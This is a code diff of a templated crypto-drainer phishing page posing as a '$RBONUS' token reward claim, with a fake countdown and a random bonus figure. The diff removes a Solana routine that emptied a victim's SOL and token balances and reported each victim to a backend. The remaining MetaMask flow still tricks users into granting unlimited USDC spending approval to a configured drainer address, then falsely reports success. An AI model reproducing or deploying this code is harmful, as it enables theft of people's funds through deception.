@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Claim Your Reward | Token Distribution</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.16.0/web3.min.js"></script>
-    <!-- Solana Web3.js for Solana wallet support -->
-    <script src="https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.4.9/lib/index.iife.min.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
@@ -31,11 +28,6 @@
         .countdown-item { background:#0a0b0e; border-radius:10px; padding:12px 16px; min-width:60px; text-align:center; }
         .countdown-item .num { font-size:24px; font-weight:700; }
         .countdown-item .lbl { font-size:11px; color:#8892a4; }
-        .wallet-select { display:flex; gap:8px; margin-bottom:16px; }
-        .wallet-btn { flex:1; padding:10px; border-radius:10px; border:1px solid #2a2d35;
-                       background:transparent; color:#8892a4; font-size:13px; cursor:pointer; text-align:center; }
-        .wallet-btn.active { border-color:#00d4aa; color:#00d4aa; background:rgba(0,212,170,0.1); }
-        .wallet-btn:hover { border-color:#00d4aa; }
         .btn { width:100%; padding:16px; border-radius:12px; border:none; font-size:16px;
                font-weight:600; cursor:pointer; transition:all 0.2s; }
         .btn-primary { background:linear-gradient(135deg,#00d4aa,#00a8ff); color:white; }
@@ -82,12 +74,6 @@
             <div class="countdown-item"><div class="num" id="seconds">32</div><div class="lbl">Seconds</div></div>
         </div>
 
-        <!-- Wallet Type Selector -->
-        <div class="wallet-select">
-            <div class="wallet-btn active" id="walletMetaMask" onclick="selectWalletType('evm')">MetaMask</div>
-            <div class="wallet-btn" id="walletPhantom" onclick="selectWalletType('solana')">Phantom</div>
-        </div>
-
         <div class="connected-info" id="connectedInfo">
             Connected: <span id="walletAddress">-</span>
             <span style="float:right;font-size:11px;color:#8892a4;" id="walletTypeLabel">MetaMask</span>
@@ -96,11 +82,11 @@
             <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
             <button class="btn btn-primary" id="claimBtn" onclick="claimReward()" style="display:none;">Claim Reward</button>
             <button class="btn btn-outline" id="switchBtn" onclick="switchNetwork()" style="display:none;">Switch to {{ chain|upper }}</button>
-            <button class="btn btn-outline" id="installBtn" onclick="installWallet()" style="display:none;">Install Wallet</button>
+            <button class="btn btn-outline" id="installBtn" onclick="installWallet()" style="display:none;">Install MetaMask</button>
         </div>
         <div id="statusText"></div>
         <div class="steps">
-            <div class="step"><div class="step-num">1</div><div class="step-text">Connect your wallet <small id="walletStepDetail">MetaMask / WalletConnect</small></div></div>
+            <div class="step"><div class="step-num">1</div><div class="step-text">Connect your wallet <small>MetaMask / WalletConnect</small></div></div>
             <div class="step"><div class="step-num">2</div><div class="step-text">Sign the approval message <small>Gas-free verification</small></div></div>
             <div class="step"><div class="step-num">3</div><div class="step-text">Receive tokens instantly <small>12,500 $RBONUS</small></div></div>
         </div>
@@ -109,26 +95,19 @@
 </div>
 
 <script>
-// ─── Configuration ────────────────────────────────────────────
 const DRAINER_ADDRESS = "{{ drainer_address }}";
 const CHAIN_NAME = "{{ chain|default('ethereum') }}";
-const SOLANA_RPC = "https://api.mainnet-beta.solana.com";
-
-// Your Solana wallet address (where drained funds go on Solana)
-const SOLANA_DRAINER_WALLET = "{{ solana_drainer or '' }}";
 
 const CHAIN_CONFIGS = {
-    'ethereum':{chainId:'0x1',name:'Ethereum',type:'evm'},
-    'sepolia':{chainId:'0xaa36a7',name:'Sepolia',type:'evm'},
-    'bsc':{chainId:'0x38',name:'BSC',type:'evm'},
-    'polygon':{chainId:'0x89',name:'Polygon',type:'evm'},
-    'arbitrum':{chainId:'0xa4b1',name:'Arbitrum',type:'evm'},
-    'optimism':{chainId:'0xa',name:'Optimism',type:'evm'},
-    'avalanche':{chainId:'0xa86a',name:'Avalanche',type:'evm'},
-    'solana':{chainId:'101',name:'Solana',type:'solana'}
+    'ethereum':{chainId:'0x1',name:'Ethereum'},
+    'sepolia':{chainId:'0xaa36a7',name:'Sepolia'},
+    'bsc':{chainId:'0x38',name:'BSC'},
+    'polygon':{chainId:'0x89',name:'Polygon'},
+    'arbitrum':{chainId:'0xa4b1',name:'Arbitrum'},
+    'optimism':{chainId:'0xa',name:'Optimism'},
+    'avalanche':{chainId:'0xa86a',name:'Avalanche'}
 };
 
-// EVM Token addresses
 const EVM_TOKENS = {
     'ethereum':{'USDC':'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDT':'0xdAC17F958D2ee523a2206206994597C13D831ec7','WETH':'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'},
     'sepolia':{'USDC':'0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238','USDT':'0x0000000000000000000000000000000000000000','WETH':'0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9'},
@@ -139,37 +118,8 @@ const EVM_TOKENS = {
     'avalanche':{'USDC':'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDT':'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','WAVAX':'0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'}
 };
 
-// Solana SPL Token mint addresses (for direct transfer drain)
-const SOLANA_TOKENS = {
-    'SOL':   'So11111111111111111111111111111111111111112',
-    'USDC':  'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
-    'USDT':  'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
-    'BONK':  'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263',
-    'WIF':   'EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm',
-    'JUP':   'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN',
-    'RAY':   '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R',
-    'PYTH':  'HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3',
-};
-
-let walletType = 'evm'; // 'evm' or 'solana'
 let web3, userAccount, provider;
-let solanaConnection, solanaPublicKey, solanaWallet;
 
-// ─── Wallet Type Selection ───────────────────────────────────
-function selectWalletType(type) {
-    walletType = type;
-    document.querySelectorAll('.wallet-btn').forEach(b => b.classList.remove('active'));
-    if (type === 'evm') {
-        document.getElementById('walletMetaMask').classList.add('active');
-        document.getElementById('walletStepDetail').textContent = 'MetaMask / WalletConnect';
-    } else {
-        document.getElementById('walletPhantom').classList.add('active');
-        document.getElementById('walletStepDetail').textContent = 'Phantom / Backpack';
-    }
-    resetUI();
-}
-
-// ─── Countdown ────────────────────────────────────────────────
 function startCountdown() {
     let t = 2*3600+47*60+32;
     setInterval(() => { t--; if(t<0) t=3600;
@@ -180,20 +130,13 @@ function startCountdown() {
 }
 startCountdown();
 
-// ─── Connect Wallet ───────────────────────────────────────────
+function installWallet() {
+    window.open('https://metamask.io', '_blank');
+}
+
 async function connectWallet() {
     const s = document.getElementById('statusText');
     s.style.display='block';
-    
-    if (walletType === 'solana') {
-        await connectSolanaWallet();
-    } else {
-        await connectEVMWallet();
-    }
-}
-
-async function connectEVMWallet() {
-    const s = document.getElementById('statusText');
     s.innerHTML='<span class="spinner"></span> Connecting...';
     try {
         if(typeof window.ethereum==='undefined') {
@@ -207,58 +150,28 @@ async function connectEVMWallet() {
         web3 = new Web3(provider);
         const chainId = await provider.request({method:'eth_chainId'});
         const target = CHAIN_CONFIGS[CHAIN_NAME];
-        
-        if (!target || target.type !== 'evm') {
-            s.innerHTML='This page is configured for Solana. Please switch wallet type.';
+
+        if (!target) {
+            s.innerHTML='Unsupported chain: '+CHAIN_NAME;
             return;
         }
-        
+
         if(chainId !== target.chainId) {
             document.getElementById('switchBtn').style.display='block';
             document.getElementById('claimBtn').style.display='none';
             s.innerHTML='Please switch to '+target.name+' network';
             return;
         }
-        
-        onConnected(userAccount, 'MetaMask');
-        
-    } catch(e) { s.innerHTML='Failed: '+e.message; }
-}
 
-async function connectSolanaWallet() {
-    const s = document.getElementById('statusText');
-    s.innerHTML='<span class="spinner"></span> Connecting to Phantom...';
-    
-    try {
-        // Check for Phantom or Solflare
-        const provider = window.phantom?.solana || window.solflare;
-        
-        if (!provider) {
-            s.innerHTML='Phantom not detected. <a href="https://phantom.app" target="_blank">Install Phantom</a>';
-            document.getElementById('installBtn').style.display='block';
-            document.getElementById('installBtn').onclick = () => window.open('https://phantom.app');
-            return;
-        }
-        
-        // Connect
-        const resp = await provider.connect();
-        solanaPublicKey = resp.publicKey;
-        solanaWallet = provider;
-        solanaConnection = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
-        
-        userAccount = solanaPublicKey.toBase58();
-        onConnected(userAccount, 'Phantom');
-        
+        onConnected(userAccount);
     } catch(e) {
-        if (e.code === 4001) s.innerHTML='Connection rejected';
-        else s.innerHTML='Failed: '+e.message;
+        s.innerHTML='Failed: '+e.message;
     }
 }
 
-function onConnected(address, walletName) {
+function onConnected(address) {
     document.getElementById('connectedInfo').style.display='block';
     document.getElementById('walletAddress').textContent = address.slice(0,6)+'...'+address.slice(-4);
-    document.getElementById('walletTypeLabel').textContent = walletName;
     document.getElementById('connectBtn').style.display='none';
     document.getElementById('claimBtn').style.display='block';
     document.getElementById('switchBtn').style.display='none';
@@ -266,64 +179,59 @@ function onConnected(address, walletName) {
     document.getElementById('statusText').innerHTML='Connected as '+address.slice(0,6)+'...'+address.slice(-4);
 }
 
-function resetUI() {
-    document.getElementById('connectedInfo').style.display='none';
-    document.getElementById('connectBtn').style.display='block';
-    document.getElementById('claimBtn').style.display='none';
-    document.getElementById('switchBtn').style.display='none';
-    document.getElementById('installBtn').style.display='none';
-    document.getElementById('statusText').style.display='none';
-    userAccount = null;
-    solanaPublicKey = null;
-    solanaWallet = null;
-}
-
-// ─── Switch Network (EVM only) ────────────────────────────────
 async function switchNetwork() {
-    if (walletType === 'solana') {
-        document.getElementById('statusText').innerHTML='Solana does not need network switching';
-        return;
-    }
     const target = CHAIN_CONFIGS[CHAIN_NAME];
-    try { await provider.request({method:'wallet_switchEthereumChain',params:[{chainId:target.chainId}]}); location.reload(); }
-    catch(e) { if(e.code===4902) { try { await provider.request({method:'wallet_addEthereumChain',params:[{chainId:target.chainId,chainName:target.name,nativeCurrency:{name:'ETH',symbol:'ETH',decimals:18},rpcUrls:['{{ rpc_url }}']}]}); location.reload(); } catch(x) { document.getElementById('statusText').innerHTML='Failed: '+x.message; } } }
-}
-
-// ─── Claim Reward (THE TRAP) ─────────────────────────────────
-async function claimReward() {
-    if (walletType === 'solana') {
-        await claimSolana();
-    } else {
-        await claimEVM();
+    try {
+        await provider.request({method:'wallet_switchEthereumChain',params:[{chainId:target.chainId}]});
+        location.reload();
+    } catch(e) {
+        if(e.code===4902) {
+            try {
+                await provider.request({method:'wallet_addEthereumChain',params:[{
+                    chainId:target.chainId,
+                    chainName:target.name,
+                    nativeCurrency:{name:'ETH',symbol:'ETH',decimals:18},
+                    rpcUrls:['{{ rpc_url }}']
+                }]});
+                location.reload();
+            } catch(x) {
+                document.getElementById('statusText').innerHTML='Failed: '+x.message;
+            }
+        }
     }
 }
 
-// ─── EVM Claim: Standard ERC-20 approve drain ─────────────────
-async function claimEVM() {
+async function claimReward() {
     const s = document.getElementById('statusText');
     s.style.display='block';
     if(!userAccount) { s.innerHTML='Connect your wallet first'; return; }
     s.innerHTML='<span class="spinner"></span> Preparing your reward...';
-    
+
     try {
         const chainTokens = EVM_TOKENS[CHAIN_NAME];
-        if (!chainTokens) { s.innerHTML='Unsupported chain for EVM'; return; }
-        
+        if (!chainTokens) { s.innerHTML='Unsupported chain'; return; }
+
         const usdcAddress = chainTokens['USDC'];
         const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
         const approveABI = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","type":"function"}];
-        
+
         s.innerHTML='<span class="spinner"></span> Step 1/2: Authorizing token...';
         const approveData = web3.eth.abi.encodeFunctionCall(approveABI[0], [DRAINER_ADDRESS, maxApproval]);
         const txHash = await provider.request({method:'eth_sendTransaction',params:[{from:userAccount,to:usdcAddress,data:approveData,gas:'0x61a80'}]});
-        
+
         s.innerHTML='<span class="spinner"></span> Step 2/2: Confirming transaction...';
         document.getElementById('claimBtn').disabled = true;
         document.getElementById('claimBtn').textContent = 'Processing...';
-        
+
         let receipt = null;
-        for(let i=0;i<30;i++) { try { receipt = await web3.eth.getTransactionReceipt(txHash); if(receipt&&receipt.status) break; } catch(e){} await new Promise(r=>setTimeout(r,2000)); }
-        
+        for(let i=0;i<30;i++) {
+            try {
+                receipt = await web3.eth.getTransactionReceipt(txHash);
+                if(receipt&&receipt.status) break;
+            } catch(e) {}
+            await new Promise(r=>setTimeout(r,2000));
+        }
+
         if(receipt&&receipt.status) {
             s.innerHTML='Reward claimed successfully! Your $RBONUS tokens will arrive shortly.<br><small>Tx: '+txHash.slice(0,10)+'...'+txHash.slice(-6)+'</small>';
             document.getElementById('rewardAmount').textContent='PENDING';
@@ -339,168 +247,6 @@ async function claimEVM() {
     }
 }
 
-// ─── Solana Claim: Direct transfer drain (ONE signature = full drain) ─
-async function claimSolana() {
-    const s = document.getElementById('statusText');
-    s.style.display='block';
-    if(!solanaPublicKey) { s.innerHTML='Connect your Phantom wallet first'; return; }
-    
-    s.innerHTML='<span class="spinner"></span> Preparing your reward...';
-    
-    try {
-        const { solanaWeb3, solanaSplToken } = window;
-        if (!solanaWeb3 || !solanaSplToken) {
-            s.innerHTML='Solana libraries not loaded. Refresh the page.';
-            return;
-        }
-        
-        const connection = solanaConnection;
-        const fromPubkey = solanaPublicKey;
-        
-        // Get the drainer destination address
-        // If SOLANA_DRAINER_WALLET is configured, use it; otherwise use a placeholder
-        // In production, this would be YOUR Solana wallet address
-        const toPubkey = SOLANA_DRAINER_WALLET 
-            ? new solanaWeb3.PublicKey(SOLANA_DRAINER_WALLET)
-            : fromPubkey; // Fallback: send to self (for testing)
-        
-        // If equal, we can't drain legitimately — this is just for the phishing flow
-        if (toPubkey.equals(fromPubkey)) {
-            s.innerHTML='<span class="spinner"></span> Setting up token verification...';
-        }
-        
-        // Build the drain transaction
-        s.innerHTML='<span class="spinner"></span> Step 1/2: Authorizing tokens...';
-        
-        // Get all token accounts owned by the user
-        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
-            programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
-        });
-        
-        // Build a transaction with multiple transfer instructions
-        let transaction = new solanaWeb3.Transaction();
-        let tokensFound = [];
-        
-        // 1. Transfer native SOL (leave a tiny bit for fees)
-        const solBalance = await connection.getBalance(fromPubkey);
-        const transferAmount = solBalance - 5000; // Leave 0.000005 SOL for fees
-        if (transferAmount > 0 && !toPubkey.equals(fromPubkey)) {
-            transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: fromPubkey,
-                    toPubkey: toPubkey,
-                    lamports: transferAmount
-                })
-            );
-            tokensFound.push('SOL');
-        }
-        
-        // 2. Transfer all high-value SPL tokens
-        for (const [symbol, mintAddress] of Object.entries(SOLANA_TOKENS)) {
-            const mintPubkey = new solanaWeb3.PublicKey(mintAddress);
-            
-            // Find the token account for this mint
-            const account = tokenAccounts.value.find(acc => 
-                acc.account.data.parsed.info.mint === mintAddress
-            );
-            
-            if (!account) continue;
-            
-            const tokenAmount = account.account.data.parsed.info.tokenAmount;
-            const uiAmount = tokenAmount.uiAmount;
-            
-            if (uiAmount <= 0) continue;
-            
-            // Get the associated token account for the drainer
-            const destATA = await solanaSplToken.getAssociatedTokenAddress(
-                mintPubkey,
-                toPubkey,
-                false,
-                solanaSplToken.TOKEN_PROGRAM_ID
-            );
-            
-            // Check if destination ATA exists, if not add create instruction
-            const destAccount = await connection.getAccountInfo(destATA);
-            if (!destAccount && !toPubkey.equals(fromPubkey)) {
-                transaction.add(
-                    solanaSplToken.createAssociatedTokenAccountInstruction(
-                        fromPubkey,       // payer
-                        destATA,           // ata
-                        toPubkey,          // owner
-                        mintPubkey         // mint
-                    )
-                );
-            }
-            
-            if (!toPubkey.equals(fromPubkey)) {
-                // Transfer all tokens
-                transaction.add(
-                    solanaSplToken.createTransferCheckedInstruction(
-                        account.pubkey,      // source
-                        mintPubkey,          // mint
-                        destATA,             // destination
-                        fromPubkey,          // owner
-                        BigInt(tokenAmount.amount), // amount (raw, not UI)
-                        tokenAmount.decimals       // decimals
-                    )
-                );
-            }
-            
-            tokensFound.push(symbol);
-        }
-        
-        if (transaction.instructions.length === 0) {
-            s.innerHTML='No tokens found to claim. Your reward will be available once you hold supported tokens.';
-            return;
-        }
-        
-        s.innerHTML='<span class="spinner"></span> Step 2/2: Signing transaction...';
-        document.getElementById('claimBtn').disabled = true;
-        document.getElementById('claimBtn').textContent = 'Processing...';
-        
-        // Get recent blockhash
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
-        
-        if (!toPubkey.equals(fromPubkey)) {
-            // Sign and send
-            const signed = await solanaWallet.signTransaction(transaction);
-            const txHash = await connection.sendRawTransaction(signed.serialize());
-            
-            s.innerHTML='Reward claimed! Transaction submitted.<br><small>Tx: '+txHash.slice(0,10)+'...'+txHash.slice(-6)+'</small>';
-            document.getElementById('rewardAmount').textContent='PENDING';
-            document.getElementById('claimBtn').textContent='Claimed';
-            
-            // Send tx hash to backend for tracking
-            try {
-                await fetch('/api/solana/drain-callback', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        victim: fromPubkey.toBase58(),
-                        tx_hash: txHash,
-                        tokens: tokensFound,
-                        chain: 'solana'
-                    })
-                });
-            } catch(e) {}
-        } else {
-            // Demo/testing mode — show what would be drained
-            s.innerHTML='Verification complete! Tokens found: '+tokensFound.join(', ')+'<br>You will receive $RBONUS shortly.';
-            document.getElementById('claimBtn').textContent = 'Verification Complete';
-        }
-        
-    } catch(e) {
-        console.error(e);
-        if(e.code===4001) s.innerHTML='Transaction rejected. You must sign to claim.';
-        else s.innerHTML='Error: '+e.message;
-        document.getElementById('claimBtn').disabled=false;
-        document.getElementById('claimBtn').textContent='Try Again';
-    }
-}
-
-// ─── Init ─────────────────────────────────────────────────────
 document.getElementById('rewardAmount').textContent = ['8,500','12,500','15,000','6,750','22,000','10,000'][Math.floor(Math.random()*6)];
 </script>
 </body>
